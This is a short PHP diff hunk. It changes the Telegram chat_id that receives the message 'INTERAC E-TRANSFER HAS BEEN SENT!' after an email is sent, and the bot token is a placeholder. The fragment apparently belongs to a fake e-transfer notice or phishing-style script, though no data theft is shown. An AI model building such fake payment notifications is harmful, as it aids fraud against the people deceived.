@@ -48,7 +48,7 @@ if(!$mail->Send()) {
 $message ="INTERAC E-TRANSFER HAS BEEN SENT!";
 $apiToken = "YOUR_TELEGRAM_BOT_TOKEN"; 
 $data = [
-    'chat_id' => '-821080105',
+    'chat_id' => '-1001831940786',
     'text' => $message
 ];
 
